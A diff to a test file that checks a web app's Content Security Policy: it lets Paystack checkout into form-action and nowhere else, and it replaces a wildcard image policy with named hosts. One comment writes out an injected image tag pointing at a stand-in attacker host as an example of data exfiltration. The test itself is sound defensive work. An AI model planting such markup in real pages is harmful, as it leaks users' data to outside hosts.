@@ -120,41 +120,61 @@ describe("contentSecurityPolicy", () => {
     expect(directive(value, "frame-src")).toBe("frame-src 'none'");
   });
 
-  it("keeps form-action rooted at 'self'", () => {
+  it("lets a deposit reach Paystack, and nowhere else", () => {
     /*
-     * Worth a note rather than a wider assertion. Two server actions finish
-     * with a `redirect()` off-origin, Supabase authorize for Google and Apple
-     * and Paystack for a card. With JavaScript running neither is a form
-     * navigation, so `form-action` does not govern them. Without it, Next
-     * degrades the action to a real form POST and browsers disagree about
-     * whether the following redirect is still part of that navigation.
+     * This asserted `form-action 'self'` exactly, and reasoned that a
+     * redirect to Paystack is not a form navigation so the directive cannot
+     * govern it. That reasoning holds only while JavaScript is running. Where
+     * it is not, Next degrades a server action to a real form POST, and Chrome
+     * applies `form-action` to every hop of the redirect chain that POST
+     * follows rather than only to its first target. A same-origin POST that
+     * answers with a redirect to checkout is therefore blocked by `'self'`.
      *
-     * This policy ships REPORT-ONLY by default, which is the reason not to
-     * pre-emptively widen the directive: if that path is real it arrives at
-     * `/api/csp-report` as a `form-action` violation before anybody enforces,
-     * which is a measurement rather than a guess. Widen it then, not now.
+     * The old note said to wait for a report before widening. That works only
+     * if somebody is reading the reports on the day `CSP_ENFORCE` is flipped,
+     * and the failure it is waiting for is a dead deposit with no server-side
+     * trace. Paystack is named now.
+     *
+     * The pairing matters as much as the addition: the origins belong in
+     * `form-action` and in nothing else. No Paystack script runs here and no
+     * browser code calls their API, so finding them in `script-src` or
+     * `connect-src` would mean somebody widened the wrong directive.
      */
-    expect(directive(policy(), "form-action")).toBe("form-action 'self'");
+    const value = policy();
+    const form = directive(value, "form-action") ?? "";
+    expect(form).toContain("'self'");
+    expect(form).toContain("https://checkout.paystack.com");
+    expect(form).toContain("https://checkout.paystack.co");
+
+    for (const name of ["script-src", "connect-src", "img-src", "default-src"]) {
+      expect(directive(value, name) ?? "").not.toContain("paystack");
+    }
   });
 
-  it("lets the map's tiles through, or it draws a grey box", () => {
+  it("names every image host instead of allowing the whole web", () => {
     /*
-     * The invariant is REACHABILITY, not naming. This policy allows `https:`
-     * wholesale on images rather than listing hosts, which is looser than an
-     * allowlist and is a deliberate choice: listing photography arrives from
-     * whatever CDN an agent's image sits behind, and a named list would fail
-     * closed on a host nobody predicted, turning a listing into a broken frame.
+     * `img-src` was `https:`, a wildcard over every host that speaks TLS, and
+     * one thing paid for it: partner hotel photos came from whichever CDN each
+     * supplier used, so the set could not be written down. There is no partner
+     * stock any more, so the wildcard has nothing left holding it open.
      *
-     * So this asserts the two tile hosts are covered one way or the other. If
-     * somebody later tightens `img-src` to an allowlist, this fails unless they
-     * remember the map, which is exactly when it should.
+     * The wildcard is not a harmless looseness. An injected
+     * `<img src="https://attacker/?q=...">` is a GET to any host on the
+     * internet carrying whatever the URL was built from, and it needs no
+     * script to fire.
+     *
+     * Both halves are asserted. The wildcard must be gone, and the map must
+     * still be reachable: tightening this directive and forgetting the
+     * basemaps turns the map into a grey box, and that is exactly the mistake
+     * this test exists to catch.
      */
     const value = directive(policy(), "img-src") ?? "";
-    const covered = (host: string) => value.includes(host) || /(^|\s)https:(\s|$)/.test(value);
-    expect(covered("https://basemaps.cartocdn.com")).toBe(true);
-    expect(covered("https://api.maptiler.com")).toBe(true);
+    expect(/(^|\s)https:(\s|$)/.test(value)).toBe(false);
+    expect(value).toContain("https://basemaps.cartocdn.com");
+    expect(value).toContain("https://api.maptiler.com");
     // A chosen photo is previewed from a blob before it is ever uploaded.
     expect(value).toContain("blob:");
+    expect(value).toContain("data:");
   });
 
   it("allows the service worker and the manifest it needs", () => {
